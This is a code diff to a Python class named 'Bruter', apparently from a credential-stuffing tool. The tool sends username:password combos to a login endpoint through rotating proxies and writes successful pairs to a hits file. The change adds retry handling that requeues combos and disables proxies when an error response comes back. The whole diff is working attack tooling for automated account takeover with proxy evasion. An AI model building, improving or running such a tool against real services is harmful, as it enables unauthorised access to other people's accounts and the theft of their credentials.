@@ -28,16 +28,21 @@ class Bruter:
             browser.build_payload()
             response = browser.post()
 
-            if response.ok and response_error not in response.text:
-                self.proxy_manager.disable(proxy, tested=True)
-                self.tested += 1
-                self.last_combo = combo
+            if response.ok:
+                if response_error not in response.text:
+                    self.proxy_manager.disable(proxy, tested=True)
+                    self.tested += 1
+                    self.last_combo = combo
 
-                if response_success in response.text:
-                    hits_file = open(self.path_hits_file, 'a+', encoding='utf-8', errors='ignore')
-                    hits_file.write(combo[0] + ':' + combo[1] + '\n')
-                    hits_file.close()
-                    self.hits += 1
+                    if response_success in response.text:
+                        hits_file = open(self.path_hits_file, 'a+', encoding='utf-8', errors='ignore')
+                        hits_file.write(combo[0] + ':' + combo[1] + '\n')
+                        hits_file.close()
+                        self.hits += 1
+                else:
+                    self.proxy_manager.disable(proxy, retries=True)
+                    self.combo_queue.appendleft(combo)
+                    self.retries += 1
 
             else:
                 raise()
